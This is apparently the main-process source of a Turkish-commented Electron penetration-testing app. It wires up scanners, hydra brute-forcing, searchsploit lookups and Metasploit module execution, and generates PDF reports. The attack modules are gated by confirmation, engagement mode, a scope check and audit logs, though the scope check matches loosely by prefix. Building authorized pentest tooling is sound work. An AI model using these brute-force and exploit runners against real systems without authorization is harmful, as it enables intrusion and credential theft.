// --no-launch: distroyu interaktif açmaz, böylece ilk açılış kullanıcı oluşturma istemi çıkmaz.
// Tüm araç işlemleri zaten 'wsl -u root' ile çalıştığından varsayılan root yeterlidir.
ipcMain.handle('wsl:install', async () => {
  if (process.platform !== 'win32') return { ok: false, error: 'sadece Windows' };
  try {
    exec('powershell -Command "Start-Process wsl -ArgumentList \'--install\',\'-d\',\'Ubuntu\',\'--no-launch\' -Verb RunAs"', { windowsHide: true });
    log('WSL kurulumu başlatıldı (root distro, --no-launch).');
    return { ok: true };
  } catch (e) { return { ok: false, error: String(e) }; }
});

// Distroyu root olarak başlat/hazırla (ilk komut çalıştırma distroyu kullanıcı istemi olmadan başlatır).
ipcMain.handle('wsl:prepareRoot', async () => {
  if (process.platform !== 'win32') return { ok: false, error: 'sadece Windows' };
  return new Promise((resolve) => {
    exec('wsl.exe -u root -- bash -lc "id -un && apt-get --version >/dev/null 2>&1; echo HAZIR"',
      { windowsHide: true, timeout: 120000 }, (err, stdout) => {
        if (err) return resolve({ ok: false, error: String(err) });
        resolve({ ok: true, output: (stdout || '').trim() });
      });
  });
});

// Bir aracın kurulu olup olmadığını platforma göre kontrol et.
function whichTool(id) {
  return new Promise((res) => {
    if (IS_WIN) return exec(`wsl.exe -- which ${id}`, { windowsHide: true }, (err, out) => res(!err && !!(out || '').trim()));
    exec(`command -v ${id}`, { windowsHide: true }, (err, out) => res(!err && !!(out || '').trim()));
  });
}

// Tüm araçların kurulu olup olmadığını topluca kontrol et.
// "kurulu" = portable binary VAR  ya da  (Windows'ta WSL içinde / Linux-macOS'ta PATH'te) bulunabiliyor.
ipcMain.handle('tools:check', async () => {
  const tools = {}; const portableMap = {};
  const ids = TOOL_CATALOG.map((x) => x.id);
  // Portable durumu (her platformda destekleniyorsa)
  ids.forEach((id) => { if (portable.binPath(id)) { tools[id] = true; portableMap[id] = true; } });

  if (!IS_WIN) {
    for (const id of ids) if (!tools[id]) tools[id] = await whichTool(id);
    return { wsl: true, native: true, tools, portable: portableMap };
  }
  const wslOk = await new Promise((res) =>
    exec('wsl.exe -l -q', { windowsHide: true, encoding: 'utf16le' }, (err, out) => res(!err && !!(out || '').trim())));
  if (!wslOk) return { wsl: false, tools, portable: portableMap };
  for (const id of ids) if (!tools[id]) tools[id] = await whichTool(id);
  return { wsl: true, tools, portable: portableMap };
});

// Araçları WSL içinde root olarak kur (çıktıyı canlı akıt). 'all' → tüm araçlar.
let currentInstall = null;
function runInstall(script, label) {
  if (currentInstall) return { ok: false, error: 'Zaten bir kurulum sürüyor' };
  try {
    // -u root: sudo şifresi gerektirmez. DEBIAN_FRONTEND: apt etkileşimsiz.
    currentInstall = spawn('wsl.exe', ['-u', 'root', '--', 'bash', '-lc', 'export DEBIAN_FRONTEND=noninteractive; ' + script], { windowsHide: true });
  } catch (err) { return { ok: false, error: String(err) }; }
  mainWindow.webContents.send('tools:installOut', `=== ${label} kurulumu başladı ===\n`);
  currentInstall.stdout.on('data', (d) => mainWindow.webContents.send('tools:installOut', d.toString()));
  currentInstall.stderr.on('data', (d) => mainWindow.webContents.send('tools:installOut', d.toString()));
  currentInstall.on('close', (code) => { mainWindow.webContents.send('tools:installDone', { code }); currentInstall = null; });
  currentInstall.on('error', (err) => { mainWindow.webContents.send('tools:installOut', '[HATA] ' + err); currentInstall = null; });
  return { ok: true };
}
ipcMain.handle('tools:install', async (e, toolId) => {
  if (toolId === 'all') {
    // Her aracın kendi install scriptini sırayla çalıştır; biri patlarsa diğerine geç.
    const parts = TOOL_CATALOG
      .filter((x) => x.install)
      .map((x) => `echo '===== ${x.id} =====' && ( ${x.install} ) || echo '*** ${x.id} BAŞARISIZ ***'`);
    return runInstall(parts.join(' ; '), 'Tüm araçlar');
  }
  const tdef = TOOL_CATALOG.find((x) => x.id === toolId);
  if (!tdef) return { ok: false, error: 'Bilinmeyen araç' };
  if (!tdef.install) return { ok: false, error: 'Bu araç dahili (kurulum gerektirmez)' };
  return runInstall(tdef.install, tdef.name);
});

// ---------------- Portable araç yöneticisi (WSL'siz native binary) ----------------
ipcMain.handle('portable:status', async () => portable.statusAll());

let currentPortable = null;
ipcMain.handle('portable:install', async (e, id) => {
  if (currentPortable) return { ok: false, error: 'Zaten bir portable kurulum sürüyor: ' + currentPortable };
  if (!portable.isSupported(id)) return { ok: false, error: 'Bu platformda portable desteklenmiyor.' };
  currentPortable = id;
  mainWindow.webContents.send('portable:progress', { id, phase: 'start', pct: 0, msg: 'Başlatılıyor...' });
  try {
    const r = await portable.install(id, (p) => mainWindow.webContents.send('portable:progress', { id, ...p }));
    log(`portable kuruldu: ${id} @ ${r.path} (${r.version})`);
    mainWindow.webContents.send('portable:done', { id, ok: true, ...r });
    return { ok: true, ...r };
  } catch (err) {
    log(`portable kurulum hatası (${id}): ${err}`);
    mainWindow.webContents.send('portable:done', { id, ok: false, error: String(err.message || err) });
    return { ok: false, error: String(err.message || err) };
  } finally { currentPortable = null; }
});

ipcMain.handle('portable:installAll', async () => {
  if (currentPortable) return { ok: false, error: 'Zaten bir portable kurulum sürüyor.' };
  const ids = portable.listSupported();
  const results = {};
  for (const id of ids) {
    currentPortable = id;
    mainWindow.webContents.send('portable:progress', { id, phase: 'start', pct: 0, msg: `${id} kuruluyor...` });
    try {
      const r = await portable.install(id, (p) => mainWindow.webContents.send('portable:progress', { id, ...p }));
      results[id] = { ok: true, version: r.version };
      mainWindow.webContents.send('portable:done', { id, ok: true, ...r });
    } catch (err) {
      results[id] = { ok: false, error: String(err.message || err) };
      mainWindow.webContents.send('portable:done', { id, ok: false, error: String(err.message || err) });
    }
  }
  currentPortable = null;
  mainWindow.webContents.send('portable:allDone', results);
  return { ok: true, results };
});

ipcMain.handle('portable:uninstall', async (e, id) => ({ ok: portable.uninstall(id) }));

// ---------------- nuclei taraması ----------------
let currentNuclei = null;
ipcMain.handle('nuclei:run', async (e, { target, severity }) => {
  if (currentNuclei) return { ok: false, error: 'Zaten çalışan nuclei var.' };
  const nucleiArgs = ['-u', target, '-jsonl', '-silent', '-nc'];
  if (severity && severity !== 'all') { nucleiArgs.push('-severity', severity); }
  const { cmd, args } = toolProc('nuclei', nucleiArgs);
  try { currentNuclei = spawn(cmd, args, { windowsHide: true }); }
  catch (err) { return { ok: false, error: String(err) }; }
  log('nuclei: ' + args.join(' '));

  const findings = [];
  let buf = '';
  let nucleiTranscript = '';
  const NBUF_MAX = 2 * 1024 * 1024;
  currentNuclei.stdout.on('data', (d) => {
    const chunk = d.toString();
    if (nucleiTranscript.length < NBUF_MAX) nucleiTranscript += chunk;
    buf += chunk;
    let idx;
    while ((idx = buf.indexOf('\n')) >= 0) {
      const line = buf.slice(0, idx).trim(); buf = buf.slice(idx + 1);
      if (!line) continue;
      try {
        const j = JSON.parse(line);
        const f = {
          host: (j.host || j.ip || target).replace(/^https?:\/\//, '').split(/[:/]/)[0],
          port: (j.port || '').toString(),
          templateId: j['template-id'] || j.templateID || '',
          name: (j.info && j.info.name) || '',
          severity: (j.info && j.info.severity) || 'info',
          cve: (j.info && j.info.classification && [].concat(j.info.classification['cve-id'] || []).filter(Boolean)[0]) || '',
          matched: j['matched-at'] || j.matched || '',
        };
        findings.push(f);
        mainWindow.webContents.send('nuclei:finding', f);
      } catch (err) { /* JSON olmayan satırları atla */ }
    }
  });
  currentNuclei.stderr.on('data', (d) => {
    const s = d.toString();
    if (nucleiTranscript.length < NBUF_MAX) nucleiTranscript += s;
    mainWindow.webContents.send('nuclei:out', s);
  });
  currentNuclei.on('close', (code) => {
    try {
      const ws = db.getActiveWorkspace();
      if (ws && findings.length) db.addNucleiFindings(ws.id, findings);
    } catch (err) { log('nuclei persist hatası: ' + err); }
    try {
      const summary = `\n# findings: ${findings.length}\n` +
        findings.map((f) => `[${f.severity}] ${f.host}:${f.port || '-'} ${f.templateId} ${f.cve || ''}`).join('\n');
      writeAutoEvidence({ tool: 'nuclei', target, command: `nuclei -u ${target}`,
                          output: nucleiTranscript + summary, exitCode: code });
    } catch (err) { log('auto-evidence (nuclei) hatası: ' + err); }
    mainWindow.webContents.send('nuclei:done', { code, count: findings.length });
    currentNuclei = null;
  });
  currentNuclei.on('error', (err) => { mainWindow.webContents.send('nuclei:out', '[HATA] ' + err); currentNuclei = null; });
  return { ok: true };
});
ipcMain.handle('nuclei:stop', async () => { if (currentNuclei) { currentNuclei.kill(); currentNuclei = null; return { ok: true }; } return { ok: false }; });

// ---------------- Genel araç çalıştırıcı (masscan, enum4linux, gobuster, nikto, whatweb) ----------------
function sanitizeTarget(t) {
  // Yalnızca IP/host/CIDR/URL karakterlerine izin ver (kabuk enjeksiyonunu önle)
  return /^[a-zA-Z0-9._:\/\-]+$/.test((t || '').trim());
}
const RUN_TEMPLATES = {
  // masscan ham soket ister -> root
  masscan: (target, o) => ({ tool: 'masscan', root: true, args: [target, '-p' + (o.ports || '1-1000'), '--rate', String(o.rate || 1000)] }),
  enum4linux: (target) => ({ tool: 'enum4linux', args: ['-a', target] }),
  gobuster: (target, o) => ({ tool: 'gobuster', args: ['dir', '-u', (target.startsWith('http') ? target : 'http://' + target),
    '-w', o.wordlist || '/usr/share/wordlists/dirb/common.txt', '-q'] }),
  nikto: (target) => ({ tool: 'nikto', args: ['-h', target] }),
  whatweb: (target) => ({ tool: 'whatweb', args: [target] }),
  // --- yeni portable Go araçları ---
  naabu: (target, o) => ({ tool: 'naabu', args: ['-host', target, '-silent', ...(o.ports ? ['-p', o.ports] : ['-top-ports', '1000'])] }),
  subfinder: (target) => ({ tool: 'subfinder', args: ['-d', target, '-silent'] }),
  amass: (target) => ({ tool: 'amass', args: ['enum', '-d', target, '-passive'] }),
  dnsx: (target) => ({ tool: 'dnsx', args: ['-d', target, '-a', '-aaaa', '-cname', '-mx', '-ns', '-txt', '-resp', '-silent'] }),
  httpx: (target) => ({ tool: 'httpx', args: ['-u', target, '-silent', '-status-code', '-title', '-tech-detect', '-server', '-no-color'] }),
  katana: (target) => ({ tool: 'katana', args: ['-u', target, '-silent', '-d', '2', '-no-color'] }),
  ffuf: (target, o) => ({ tool: 'ffuf', args: ['-u', (target.includes('FUZZ') ? target : target.replace(/\/?$/, '/FUZZ')),
    '-w', o.wordlist || '/usr/share/wordlists/dirb/common.txt', '-mc', '200,204,301,302,307,401,403', '-s'] }),
  sqlmap: (target) => ({ tool: 'sqlmap', args: ['-u', target, '--batch', '--level=1', '--risk=1'] }),
  hashcat: (target, o) => ({ tool: 'hashcat', args: ['-m', String(o.mode || '0'), '-a', '0', target, o.wordlist || '/usr/share/wordlists/rockyou.txt'] }),
  john: (target, o) => ({ tool: 'john', args: ['--wordlist=' + (o.wordlist || '/usr/share/wordlists/rockyou.txt'), target] }),
};
let currentTool = null;
ipcMain.handle('tool:run', async (e, { tool, target, opts }) => {
  if (currentTool) return { ok: false, error: 'Zaten çalışan bir araç var.' };
  if (!RUN_TEMPLATES[tool]) return { ok: false, error: 'Bilinmeyen araç' };
  if (!sanitizeTarget(target)) return { ok: false, error: 'Geçersiz hedef' };
  const tpl = RUN_TEMPLATES[tool](target.trim(), opts || {});
  const { cmd, args } = toolProc(tpl.tool, tpl.args, { root: tpl.root });
  try { currentTool = spawn(cmd, args, { windowsHide: true }); }
  catch (err) { return { ok: false, error: String(err) }; }
  log(`${tool}: wsl ${args.join(' ')}`);

  const masscanPorts = [];
  let toolBuf = '';
  const TBUF_MAX = 2 * 1024 * 1024;
  const headerLine = `=== ${tool} ${target} ===\n`;
  toolBuf += headerLine;
  mainWindow.webContents.send('tool:out', headerLine);
  currentTool.stdout.on('data', (d) => {
    const s = d.toString();
    if (toolBuf.length < TBUF_MAX) toolBuf += s;
    mainWindow.webContents.send('tool:out', s);
    if (tool === 'masscan') {
      // "Discovered open port 80/tcp on 192.168.0.1"
      const re = /Discovered open port (\d+)\/(tcp|udp) on ([\d.]+)/g; let m;
      while ((m = re.exec(s))) masscanPorts.push({ port: m[1], proto: m[2], ip: m[3] });
    }
  });
  currentTool.stderr.on('data', (d) => {
    const s = d.toString();
    if (toolBuf.length < TBUF_MAX) toolBuf += s;
    mainWindow.webContents.send('tool:out', s);
  });
  currentTool.on('close', (code) => {
    // masscan sonuçlarını asset graph'a yaz
    if (tool === 'masscan' && masscanPorts.length) {
      try {
        const byIp = {};
        masscanPorts.forEach((p) => {
          (byIp[p.ip] = byIp[p.ip] || { ip: p.ip, status: 'up', ports: [], vulns: [], deviceType: 'unknown', mac: '', vendor: '', name: '', osGuess: '' })
            .ports.push({ port: p.port, proto: p.proto, state: 'open', service: '', version: '' });
        });
        const ws = db.getActiveWorkspace();
        if (ws) db.persistScan(ws.id, { target, command: `masscan ${target}`, parsed: { hosts: Object.values(byIp) } });
      } catch (err) { log('masscan persist hatası: ' + err); }
    }
    try {
      writeAutoEvidence({ tool, target, command: `${tool} ${target}`, output: toolBuf, exitCode: code });
    } catch (err) { log('auto-evidence (tool) hatası: ' + err); }
    mainWindow.webContents.send('tool:done', { tool, code, count: masscanPorts.length });
    currentTool = null;
  });
  currentTool.on('error', (err) => { mainWindow.webContents.send('tool:out', '[HATA] ' + err); currentTool = null; });
  return { ok: true };
});
ipcMain.handle('tool:stop', async () => { if (currentTool) { currentTool.kill(); currentTool = null; return { ok: true }; } return { ok: false }; });

// ---------------- Exploit arama (searchsploit — salt-okunur, güvenli) ----------------
ipcMain.handle('exploit:search', async (e, term) => {
  // Arama terimi: harf/rakam/boşluk/.-_/ izinli; kabuk metakarakterleri yasak
  if (!/^[a-zA-Z0-9 ._/-]{1,80}$/.test(term || '')) return { ok: false, error: 'Geçersiz arama terimi' };
  const { cmd, args } = toolProc('searchsploit', ['--color=never', ...term.trim().split(/\s+/)]);
  return new Promise((resolve) => {
    execFile(cmd, args, { windowsHide: true, timeout: 60000, maxBuffer: 4 * 1024 * 1024 }, (err, stdout, stderr) => {
      resolve({ ok: true, output: (stdout || '') + (stderr || '') });
    });
  });
});

// ---------------- Oto-exploit eşleme (servis sürümü -> searchsploit JSON) ----------------
ipcMain.handle('exploit:auto', async (e, terms) => {
  if (!Array.isArray(terms)) return { ok: false, error: 'liste bekleniyor' };
  const uniq = [...new Set(terms.map((x) => (x || '').trim())
    .filter((x) => x && /^[a-zA-Z0-9 ._/-]{2,60}$/.test(x)))].slice(0, 25);
  const results = {};
  for (const term of uniq) {
    const { cmd, args } = toolProc('searchsploit', ['-j', '--color=never', ...term.split(/\s+/)]);
    results[term] = await new Promise((resolve) => {
      execFile(cmd, args, { windowsHide: true, timeout: 45000, maxBuffer: 4 * 1024 * 1024 }, (err, stdout) => {
        let list = [];
        try {
          const j = JSON.parse(stdout || '{}');
          list = (j.RESULTS_EXPLOIT || []).map((r) => ({
            title: r.Title || '', path: r.Path || '', edb: r['EDB-ID'] || '',
          }));
        } catch (_) { /* JSON parse edilemezse boş */ }
        resolve(list);
      });
    });
  }
  return { ok: true, results };
});

// ---------------- Hydra (saldırgan modül — sıkı kapı) ----------------
const HYDRA_SERVICES = ['ssh', 'ftp', 'rdp', 'smb', 'telnet', 'mysql', 'postgres', 'vnc', 'http-get', 'http-post-form'];
function inScopeMain(target, scope) {
  if (!scope || !scope.trim()) return null;
  const t = (target || '').trim();
  return scope.split(/[,\s]+/).map((x) => x.trim()).filter(Boolean).some((e) => {
    const base = e.split('/')[0];
    const prefix = base.split('.').slice(0, 3).join('.');
    return t === base || t.startsWith(prefix + '.') || t.startsWith(base);
  });
}
let currentHydra = null;
ipcMain.handle('attack:hydra', async (e, { target, service, user, userList, passList, confirmed }) => {
  if (currentHydra) return { ok: false, error: 'Zaten çalışan hydra var.' };
  // KAPI 1: açık onay
  if (!confirmed) return { ok: false, error: 'Onay gerekli' };
  // KAPI 2: engagement modu + scope zorunlu
  const ws = db.getActiveWorkspace();
  if (!ws || ws.mode !== 'engagement') {
    if (ws) db.addAudit(ws.id, 'blocked', `hydra reddedildi (engagement modu değil): ${target}`);
    return { ok: false, error: 'Saldırgan modüller yalnızca Engagement modunda çalışır.' };
  }
  const sc = inScopeMain(target, ws.scope);
  if (sc !== true) {
    db.addAudit(ws.id, 'blocked', `hydra kapsam dışı engellendi: ${target}`);
    return { ok: false, error: 'Hedef kapsam (scope) dışında — engellendi.' };
  }
  // KAPI 3: girdi doğrulama
  if (!sanitizeTarget(target)) return { ok: false, error: 'Geçersiz hedef' };
  if (!HYDRA_SERVICES.includes(service)) return { ok: false, error: 'Desteklenmeyen servis' };

  const hArgs = [];
  if (user && /^[a-zA-Z0-9._-]{1,32}$/.test(user)) hArgs.push('-l', user);
  else hArgs.push('-L', userList && /^[\w./-]+$/.test(userList) ? userList : '/usr/share/wordlists/metasploit/unix_users.txt');
  hArgs.push('-P', passList && /^[\w./-]+$/.test(passList) ? passList : '/usr/share/wordlists/rockyou.txt');
  hArgs.push('-t', '4', '-f', target, service);
  const { cmd, args } = toolProc('hydra', hArgs);

  try { currentHydra = spawn(cmd, args, { windowsHide: true }); }
  catch (err) { return { ok: false, error: String(err) }; }
  db.addAudit(ws.id, 'attack', `hydra ${service} → ${target} (onaylı)`);
  log('hydra: wsl ' + args.join(' '));
  mainWindow.webContents.send('tool:out', `=== hydra ${service} → ${target} (Engagement, onaylı) ===\n`);
  currentHydra.stdout.on('data', (d) => mainWindow.webContents.send('tool:out', d.toString()));
  currentHydra.stderr.on('data', (d) => mainWindow.webContents.send('tool:out', d.toString()));
  currentHydra.on('close', (code) => { mainWindow.webContents.send('tool:done', { tool: 'hydra', code }); currentHydra = null; });
  currentHydra.on('error', (err) => { mainWindow.webContents.send('tool:out', '[HATA] ' + err); currentHydra = null; });
  return { ok: true };
});
ipcMain.handle('attack:hydraStop', async () => { if (currentHydra) { currentHydra.kill(); currentHydra = null; return { ok: true }; } return { ok: false }; });

// ---------------- Metasploit (Faz 4) ----------------
// Modül arama (salt-okunur, güvenli).
ipcMain.handle('msf:search', async (e, term) => {
  if (!/^[a-zA-Z0-9 ._/:-]{1,80}$/.test(term || '')) return { ok: false, error: 'Geçersiz arama terimi' };
  const { cmd, args } = toolProc('msfconsole', ['-q', '-x', `search ${term.trim()}; exit`]);
  return new Promise((resolve) => {
    execFile(cmd, args,
      { windowsHide: true, timeout: 180000, maxBuffer: 8 * 1024 * 1024 }, (err, stdout) => {
        const out = stdout || '';
        const modules = [];
        out.split('\n').forEach((line) => {
          // "   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  average  Yes  MS17-010..."
          const m = line.match(/^\s*(\d+)\s+((?:exploit|auxiliary|post|payload|encoder|nop)\/\S+)\s+(\S*)\s+(\w+)\s+(Yes|No)\s+(.+)$/);
          if (m) modules.push({ idx: m[1], name: m[2], date: m[3], rank: m[4], check: m[5], desc: m[6].trim() });
        });
        resolve({ ok: true, modules, raw: out });
      });
  });
});

// Modül bilgisi (salt-okunur).
ipcMain.handle('msf:info', async (e, module) => {
  if (!/^[a-z0-9_\/]+$/i.test(module || '')) return { ok: false, error: 'Geçersiz modül' };
  const { cmd, args } = toolProc('msfconsole', ['-q', '-x', `info ${module}; exit`]);
  return new Promise((resolve) => {
    execFile(cmd, args,
      { windowsHide: true, timeout: 120000, maxBuffer: 4 * 1024 * 1024 }, (err, stdout) => {
        resolve({ ok: true, output: stdout || '' });
      });
  });
});

// Modül çalıştırma (SALDIRGAN — sıkı kapı: engagement + scope + onay + audit).
let currentMsf = null;
ipcMain.handle('msf:run', async (e, { module, target, options, confirmed }) => {
  if (currentMsf) return { ok: false, error: 'Zaten çalışan Metasploit oturumu var.' };
  if (!confirmed) return { ok: false, error: 'Onay gerekli' };
  const ws = db.getActiveWorkspace();
  if (!ws || ws.mode !== 'engagement') {
    if (ws) db.addAudit(ws.id, 'blocked', `msf reddedildi (engagement değil): ${module} → ${target}`);
    return { ok: false, error: 'Metasploit çalıştırma yalnızca Engagement modunda mümkün.' };
  }
  if (inScopeMain(target, ws.scope) !== true) {
    db.addAudit(ws.id, 'blocked', `msf kapsam dışı engellendi: ${target}`);
    return { ok: false, error: 'Hedef kapsam (scope) dışında — engellendi.' };
  }
  if (!/^[a-z0-9_\/]+$/i.test(module || '')) return { ok: false, error: 'Geçersiz modül' };
  if (!sanitizeTarget(target)) return { ok: false, error: 'Geçersiz hedef' };

  // Komut zincirini güvenli inşa et
  let cmds = `use ${module}; set RHOSTS ${target}`;
  (options || []).forEach((o) => {
    if (/^[A-Za-z0-9_]{1,32}$/.test(o.key) && /^[A-Za-z0-9 ._:\/-]{1,64}$/.test(o.value || '')) {
      cmds += `; set ${o.key} ${o.value}`;
    }
  });
  cmds += '; run; exit';

  const msfProc = toolProc('msfconsole', ['-q', '-x', cmds]);
  try { currentMsf = spawn(msfProc.cmd, msfProc.args, { windowsHide: true }); }
  catch (err) { return { ok: false, error: String(err) }; }
  db.addAudit(ws.id, 'attack', `msf ${module} → ${target} (onaylı)`);
  log('msf: ' + cmds);
  mainWindow.webContents.send('tool:out', `=== Metasploit: ${module} → ${target} (Engagement, onaylı) ===\n`);
  currentMsf.stdout.on('data', (d) => mainWindow.webContents.send('tool:out', d.toString()));
  currentMsf.stderr.on('data', (d) => mainWindow.webContents.send('tool:out', d.toString()));
  currentMsf.on('close', (code) => { mainWindow.webContents.send('tool:done', { tool: 'metasploit', code }); currentMsf = null; });
  currentMsf.on('error', (err) => { mainWindow.webContents.send('tool:out', '[HATA] ' + err); currentMsf = null; });
  return { ok: true };
});
ipcMain.handle('msf:stop', async () => { if (currentMsf) { currentMsf.kill(); currentMsf = null; return { ok: true }; } return { ok: false }; });

// ---------------- Profesyonel rapor (HTML) üret ----------------
ipcMain.handle('report:professional', async (e, wsId) => {
  const ws = db.listWorkspaces().find((w) => w.id === wsId) || db.getActiveWorkspace();
  if (!ws) return { ok: false, error: 'workspace yok' };
  const a = db.workspaceAssets(ws.id);
  a.evidence = db.listEvidence(ws.id);
  const html = buildProfessionalReport(ws, a);
  const { canceled, filePath } = await dialog.showSaveDialog(mainWindow, {
    title: 'Profesyonel Rapor (PDF)', defaultPath: `pentest-rapor-${ws.name}-${Date.now()}.pdf`,
    filters: [{ name: 'PDF', extensions: ['pdf'] }],
  });
  if (canceled || !filePath) return { ok: false, error: 'iptal' };
  const pdfWin = new BrowserWindow({ show: false, webPreferences: { sandbox: true } });
  try {
    await pdfWin.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(html));
    const data = await pdfWin.webContents.printToPDF({ printBackground: true, pageSize: 'A4', margins: { marginType: 'default' } });
    fs.writeFileSync(filePath, data);
    db.addAudit(ws.id, 'report', 'Profesyonel rapor üretildi');
    return { ok: true, path: filePath };
  } catch (err) { return { ok: false, error: String(err) }; }
  finally { pdfWin.destroy(); }
});

function evidenceSection(evidence) {
  if (!evidence || !evidence.length) return '';
  const items = evidence.map((ev) => {
    const isImg = /\.(png|jpg|jpeg|gif)$/i.test(ev.path || '');
    let img = '';
    if (isImg) {
      try {
        const b64 = fs.readFileSync(ev.path).toString('base64');
        const mime = ev.path.toLowerCase().endsWith('png') ? 'image/png' : 'image/jpeg';
        img = `<img src="data:${mime};base64,${b64}" style="max-width:100%;border:1px solid #ddd;border-radius:6px;margin-top:6px"/>`;
      } catch (e) {}
    }
    return `<div style="margin-bottom:18px"><b>${(ev.label || '').replace(/[<>]/g, '')}</b>
      ${ev.host_ip ? `<span style="color:#666"> · ${ev.host_ip}</span>` : ''}
      <div style="color:#999;font-size:11px">${new Date(ev.created).toLocaleString('tr-TR')}</div>${img}</div>`;
  }).join('');
  return `<h2>Kanıtlar (${evidence.length})</h2>${items}`;
}

function buildProfessionalReport(ws, a) {
  const sevRank = { critical: 4, high: 3, medium: 2, low: 1, info: 0 };
  // Kapalı (fixed/false_positive) bulguları rapordan çıkar
  const allVulns = a.vulns || [];
  const vulns = allVulns
    .filter((v) => v.status !== 'fixed' && v.status !== 'false_positive')
    .slice().sort((x, y) => (sevRank[y.severity] || 0) - (sevRank[x.severity] || 0));
  const sevCount = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  vulns.forEach((v) => { sevCount[v.severity || 'info'] = (sevCount[v.severity || 'info'] || 0) + 1; });
  const totalRisk = sevCount.critical * 4 + sevCount.high * 3 + sevCount.medium * 2 + sevCount.low;
  const riskLevel = sevCount.critical > 0 ? 'KRİTİK' : sevCount.high > 0 ? 'YÜKSEK' : sevCount.medium > 0 ? 'ORTA' : 'DÜŞÜK';
  const riskColor = sevCount.critical > 0 ? '#b91c1c' : sevCount.high > 0 ? '#ef4444' : sevCount.medium > 0 ? '#f59e0b' : '#22c55e';
  const esc = (s) => String(s == null ? '' : s).replace(/[<>&]/g, (c) => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));

  const hostRows = a.hosts.map((h) => {
    const svc = a.services.filter((s) => s.host_ip === h.ip).length;
    const vl = a.vulns.filter((v) => v.host_ip === h.ip).length;
    return `<tr><td>${esc(h.ip)}</td><td>${esc(h.name || '-')}</td><td>${esc(h.vendor || '-')}</td>
      <td>${esc(h.os || '-')}</td><td>${svc}</td><td style="color:${vl ? '#b91c1c' : '#333'}">${vl}</td></tr>`;
  }).join('');
  const vulnRows = vulns.map((v) => {
    const c = { critical: '#b91c1c', high: '#ef4444', medium: '#f59e0b', low: '#3b82f6', info: '#888' }[v.severity] || '#888';
    const status = v.status && v.status !== 'open' ? `<div style="color:#666;font-size:10px;margin-top:2px">${esc(v.status)}</div>` : '';
    const mitre = v.mitre ? `<div style="color:#999;font-size:10px">${esc(v.mitre)}</div>` : '';
    const notes = v.notes ? `<div style="color:#444;font-size:11px;margin-top:3px;font-style:italic">${esc(v.notes)}</div>` : '';
    return `<tr><td><span style="background:${c};color:#fff;padding:2px 8px;border-radius:8px;font-size:11px">${esc((v.severity || 'info').toUpperCase())}</span>${status}</td>
      <td>${esc(v.host_ip)}</td><td>${esc(v.port || '-')}</td><td>${esc(v.cve)}${mitre}${notes}</td><td>${esc(v.script || '')}</td></tr>`;
  }).join('');
  const closedCount = allVulns.length - vulns.length;

  return `<!DOCTYPE html><html><head><meta charset="utf-8"><style>
    body{font-family:'Segoe UI',Arial,sans-serif;color:#1a2230;margin:0;padding:0}
    .cover{background:linear-gradient(135deg,#1e3a5f,#0f1419);color:#fff;padding:60px 50px;}
    .cover h1{font-size:34px;margin:0 0 8px}.cover .sub{color:#9db4d0;font-size:15px}
    .cover .risk{display:inline-block;margin-top:24px;padding:10px 22px;border-radius:8px;background:${riskColor};font-weight:700;font-size:18px}
    .content{padding:40px 50px}h2{color:#1e3a5f;border-bottom:2px solid #1e3a5f;padding-bottom:6px;margin-top:34px}
    .stats{display:flex;gap:14px;margin:20px 0}.stat{flex:1;text-align:center;padding:16px;border:1px solid #ddd;border-radius:10px}
    .stat b{display:block;font-size:28px}.stat span{font-size:12px;color:#666}
    table{width:100%;border-collapse:collapse;font-size:12px;margin-top:10px}
    th{background:#1e3a5f;color:#fff;text-align:left;padding:8px}td{padding:7px 8px;border-bottom:1px solid #e2e2e2}
    .matrix{display:flex;gap:8px;margin:14px 0}.mx{flex:1;text-align:center;padding:14px;border-radius:8px;color:#fff;font-weight:700}
    .foot{margin-top:40px;padding-top:14px;border-top:1px solid #ddd;color:#999;font-size:11px}
  </style></head><body>
    <div class="cover">
      <h1>🛰️ Sızma Testi Raporu</h1>
      <div class="sub">
        ${ws.client ? `Müşteri: <b>${esc(ws.client)}</b><br>` : ''}
        Çalışma Alanı: <b>${esc(ws.name)}</b> · Mod: ${esc(ws.mode)}<br>
        Kapsam: ${esc(ws.scope || '-')}<br>
        ${(ws.start_date || ws.end_date) ? `Engagement: ${esc(ws.start_date || '?')} → ${esc(ws.end_date || '?')}<br>` : ''}
        Rapor tarihi: ${new Date().toLocaleString('tr-TR')}
      </div>
      <div class="risk">Genel Risk: ${riskLevel}</div>
    </div>
    ${ws.roe ? `<div style="background:#f3f4f6;padding:18px 50px;border-bottom:1px solid #e2e2e2">
      <b style="color:#1e3a5f">Engagement Kuralları (ROE)</b>
      <div style="white-space:pre-wrap;font-size:12px;color:#444;margin-top:6px">${esc(ws.roe)}</div></div>` : ''}
    <div class="content">
      <h2>Yönetici Özeti</h2>
      <p>Bu değerlendirmede <b>${a.hosts.length}</b> canlı varlık, <b>${a.services.length}</b> açık servis ve
      <b>${vulns.length}</b> aktif bulgu tespit edilmiştir${closedCount ? ` (${closedCount} kapalı bulgu rapordan çıkarıldı)` : ''}.
      Toplam ${a.scans.length} tarama yürütülmüştür.
      Genel risk seviyesi <b style="color:${riskColor}">${riskLevel}</b> olarak değerlendirilmiştir.</p>
      <div class="stats">
        <div class="stat"><b>${a.hosts.length}</b><span>Varlık</span></div>
        <div class="stat"><b>${a.services.length}</b><span>Servis</span></div>
        <div class="stat"><b style="color:#b91c1c">${vulns.length}</b><span>Aktif Bulgu</span></div>
        <div class="stat"><b>${riskLevel}</b><span>Risk</span></div>
      </div>
      <h2>Zafiyet Dağılımı (Risk Matrisi)</h2>
      <div class="matrix">
        <div class="mx" style="background:#b91c1c">Kritik<br>${sevCount.critical}</div>
        <div class="mx" style="background:#ef4444">Yüksek<br>${sevCount.high}</div>
        <div class="mx" style="background:#f59e0b">Orta<br>${sevCount.medium}</div>
        <div class="mx" style="background:#3b82f6">Düşük<br>${sevCount.low}</div>
        <div class="mx" style="background:#888">Bilgi<br>${sevCount.info}</div>
      </div>
      <h2>Bulgular (${vulns.length})</h2>
      ${vulns.length ? `<table><thead><tr><th>Seviye</th><th>Host</th><th>Port</th><th>CVE/Şablon</th><th>Kaynak</th></tr></thead><tbody>${vulnRows}</tbody></table>` : '<p>Zafiyet bulgusu yok.</p>'}
      <h2>Varlık Envanteri (${a.hosts.length})</h2>
